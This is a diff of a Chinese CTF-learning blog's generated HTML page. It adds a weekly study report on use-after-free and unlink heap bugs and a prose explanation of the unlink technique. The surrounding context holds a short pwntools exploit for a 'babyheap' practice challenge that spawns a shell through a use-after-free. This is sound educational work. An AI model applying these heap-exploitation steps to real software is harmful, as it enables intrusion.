@@ -172,6 +172,81 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-周报（2024-5-27-2024-6-2）" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2024/06/03/%E5%91%A8%E6%8A%A5%EF%BC%882024-5-27-2024-6-2%EF%BC%89/" class="article-date">
+  	<time datetime="2024-06-03T13:11:59.000Z" itemprop="datePublished">2024-06-03</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2024/06/03/%E5%91%A8%E6%8A%A5%EF%BC%882024-5-27-2024-6-2%EF%BC%89/">
+        周报（2024.5.27-2024.6.2）
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>又是一周过去了，这周过得还真是难评，不过也好，也算是把问题真的摆明的，这个学期学的东西确实是有一点少了，马上这个月末就是期末考试，考完这个学期就结束了，同时实验室也有考核要来，这个月的在实验室的时间必须增加了，堆的内容学到的还是太少了。</p>
+<p>这周学的终于算是有一点东西了，不过还是不够，必须增加学的进度了。</p>
+<ol>
+<li>UAF漏洞</li>
+<li>unlink</li>
+</ol>
+<p>这周差不多就学了这两个的漏洞了，题也做了一些，不过都是看着wp来的，想了一下问题还是出在对程序的理解还是没有到位，这周要学的至少也要有两个以上的知识点，</p>
+<ol>
+<li>off-by-one</li>
+<li>fastbin</li>
+</ol>
+<p>这周的学习至少这些必须要学会，同时至少要独立整出来一道题。</p>
+<p>这周过的真的是难评，不过也算是预料之中吧。</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%91%A8%E6%8A%A5/" rel="tag">周报</a></li></ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+	<a class="article-category-link" href="/categories/%E5%91%A8%E6%8A%A5/">周报</a>
+	</div>
+
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-堆基础题解法及wp" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -267,6 +342,19 @@
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io=process(<span class="string">&#x27;./babyheap&#x27;</span>)</span><br><span class="line"><span class="meta">#io = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,28382)</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="meta">#gdb.attach(io,<span class="string">&#x27;b *0x400D6E&#x27;</span>)ls</span></span><br><span class="line"><span class="meta">#pause()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def create_1(size,content):</span><br><span class="line">    io.sendafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendafter(<span class="string">&#x27;size: \n&#x27;</span>,str(size))</span><br><span class="line">    io.sendafter(<span class="string">&#x27;content: \n&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line">def delete_2(index):</span><br><span class="line">    io.sendafter(<span class="string">&#x27;Your choice: &#x27;</span>,b<span class="number">&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendafter(<span class="string">&#x27;index: \n&#x27;</span>,str(index))</span><br><span class="line"></span><br><span class="line">def print_3(index):</span><br><span class="line">    io.sendafter(<span class="string">&#x27;Your choice: &#x27;</span>,b<span class="number">&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendafter(<span class="string">&#x27;index: \n&#x27;</span>,str(index))    </span><br><span class="line"></span><br><span class="line">binsh=<span class="number">0x602010</span></span><br><span class="line">system=<span class="number">0x4007A0</span></span><br><span class="line"></span><br><span class="line">create_1(<span class="number">0x19</span>,b<span class="number">&#x27;</span>AAA<span class="number">&#x27;</span>)</span><br><span class="line">create_1(<span class="number">0x19</span>,b<span class="number">&#x27;B</span>BB<span class="number">&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete_2(<span class="number">0</span>)</span><br><span class="line">delete_2(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">create_1(<span class="number">0x10</span>,p64(binsh)+p64(system))</span><br><span class="line"></span><br><span class="line">print_3(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 <p>这道题就是一个最基础的uaf漏洞的题，写的比较详细，往对以后的这种漏洞有所启迪。</p>
+<p><strong>unlink</strong></p>
+<p>现简单说一下这一类题的大致问题在哪里，与一般的解决办法。</p>
+<p>要能使用这种解决办法的题，会以下的几种重要的东西是我们能够使用的，才能使用这种办法。</p>
+<ol>
+<li>能连续申请几个连续的堆，</li>
+<li>对于指向申请的堆的指针，会在bss段上有一个固定且已知的地点存放，并且存放的方式是连续的。</li>
+<li>必须在申请的堆中有堆溢出，用于修改下一个堆的prev size段空间</li>
+</ol>
+<p>对于这一类的题，最重要的就是在我们申请的堆中间，通过我们自己伪造一个fake chunk与bss段的存放对指针的地址，构成一个含有3个chunk的双向链表，然后在申请的宁外一个堆中使用堆溢出，从而修改下一个堆中的prev size段，并使大小为从要修改这个chunk的prev size一直到，我们伪造的fake chunk的prev size这两个地址的距离差大小，这样使得我们在后面free掉我们修改了prev size 的chunk时，程序会将从这个chunk一直到我们伪造的fake chunk的这一段地址都认为是之前已经free的chunk（prev size中记录的是上一个free chunk的大小），从而使这一个刚刚释放的free chunk，直接就把上面的一整段被识变为free chunk的地址合并了（连续的两个free chunk会被程序合并），但是我们在之前伪造的fake chunk已经与存放指针的地址，构成了一个双向链表，所以在这里fake chunk被下面的free chunk合并时，原本与之构成双项链表的那两个空间，由于与之相连的chunk被拿走了，使得那两个空间，会有一定的改变，而改变的结果就会使原本存放指针的地方存放其他地址空间，从而使用这个地址修改函数地址。</p>
+<p><img src="/2024/05/27/%E5%A0%86%E5%9F%BA%E7%A1%80%E9%A2%98%E8%A7%A3%E6%B3%95%E5%8F%8Awp/image-20240601102616025.png" alt="image-20240601102616025"></p>
+<p><img src="/2024/05/27/%E5%A0%86%E5%9F%BA%E7%A1%80%E9%A2%98%E8%A7%A3%E6%B3%95%E5%8F%8Awp/image-20240602084358411.png" alt="image-20240602084358411"></p>
+<p><img src="/2024/05/27/%E5%A0%86%E5%9F%BA%E7%A1%80%E9%A2%98%E8%A7%A3%E6%B3%95%E5%8F%8Awp/image-20240602085046748.png" alt="image-20240602085046748"></p>
+<p><img src="/2024/05/27/%E5%A0%86%E5%9F%BA%E7%A1%80%E9%A2%98%E8%A7%A3%E6%B3%95%E5%8F%8Awp/image-20240602085110947.png" alt="image-20240602085110947"></p>
 
       
     </div>
@@ -1175,8 +1263,7 @@
 <p><img src="/2024/04/09/%E5%A0%86%EF%BC%88%E9%9A%8F%E4%BE%BF%E5%86%99%E4%B8%80%E5%86%99%EF%BC%8C%E5%BD%93%E7%AC%94%E8%AE%B0%E7%94%A8%EF%BC%89/image-20240418143002441.png" alt="image-20240418143002441"></p>
 <p>用指针的方式将相同大小的chunk连接起来，存放在bin中方便之后的寻找</p>
 <p>在bin中还有一种双向链表，将相同的大小的的chunk互相链接起来，以便使用，其基本结构如下，通过两个bin指针与chunk中fd，bk的不断指向构成，其中在使用中，为依次使用，从靠近bin的顺序被依次调用。</p>
-<p><img src="/2024/04/09/%E5%A0%86%EF%BC%88%E9%9A%8F%E4%BE%BF%E5%86%99%E4%B8%80%E5%86%99%EF%BC%8C%E5%BD%93%E7%AC%94%E8%AE%B0%E7%94%A8%EF%BC%89/image-20240411162059021.png" alt="image-20240411162059021"> </p>
-<p><img src="/2024/04/09/%E5%A0%86%EF%BC%88%E9%9A%8F%E4%BE%BF%E5%86%99%E4%B8%80%E5%86%99%EF%BC%8C%E5%BD%93%E7%AC%94%E8%AE%B0%E7%94%A8%EF%BC%89/image-20240418151335033.png" alt="image-20240418151335033"></p>
+<h1 id><a href="#" class="headerlink" title></a><img src="/2024/04/09/%E5%A0%86%EF%BC%88%E9%9A%8F%E4%BE%BF%E5%86%99%E4%B8%80%E5%86%99%EF%BC%8C%E5%BD%93%E7%AC%94%E8%AE%B0%E7%94%A8%EF%BC%89/image-20240411162059021.png" alt="image-20240411162059021"></h1><p><img src="/2024/04/09/%E5%A0%86%EF%BC%88%E9%9A%8F%E4%BE%BF%E5%86%99%E4%B8%80%E5%86%99%EF%BC%8C%E5%BD%93%E7%AC%94%E8%AE%B0%E7%94%A8%EF%BC%89/image-20240418151335033.png" alt="image-20240418151335033"></p>
 <p>LIFO指其中的chunk的调用和栈上的调用方式一样，先进先出。</p>
 <p>管理的free chunk在64位的程序下位32位的程序的两倍的大小</p>
 <p><img src="/2024/04/09/%E5%A0%86%EF%BC%88%E9%9A%8F%E4%BE%BF%E5%86%99%E4%B8%80%E5%86%99%EF%BC%8C%E5%BD%93%E7%AC%94%E8%AE%B0%E7%94%A8%EF%BC%89/image-20240418152210990.png" alt="image-20240418152210990"></p>
@@ -2763,7 +2850,7 @@
 
 <p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
 <p><img src="/2024/03/26/hello-world/002917-16858097570092.jpg" alt="002917-16858097570092"></p>
-<p>INFO  Copying files from extend dirs…<br>On branch master<br>nothing to commit, working tree clean<br>Everything up-to-date<br>branch ‘master’ set up to track ‘<a href="mailto:&#x67;&#x69;&#116;&#64;&#x67;&#105;&#x74;&#x68;&#x75;&#x62;&#46;&#x63;&#111;&#109;">&#x67;&#x69;&#116;&#64;&#x67;&#105;&#x74;&#x68;&#x75;&#x62;&#46;&#x63;&#111;&#109;</a>:2023478&#x2F;2023478.github.io.git&#x2F;main’.<br>INFO  Deploy done: git</p>
+<p>INFO  Copying files from extend dirs…<br>On branch master<br>nothing to commit, working tree clean<br>Everything up-to-date<br>branch ‘master’ set up to track ‘<a href="mailto:&#x67;&#x69;&#116;&#64;&#103;&#x69;&#x74;&#x68;&#x75;&#x62;&#46;&#x63;&#x6f;&#109;">&#x67;&#x69;&#116;&#64;&#103;&#x69;&#x74;&#x68;&#x75;&#x62;&#46;&#x63;&#x6f;&#109;</a>:2023478&#x2F;2023478.github.io.git&#x2F;main’.<br>INFO  Deploy done: git</p>
 
       
     </div>
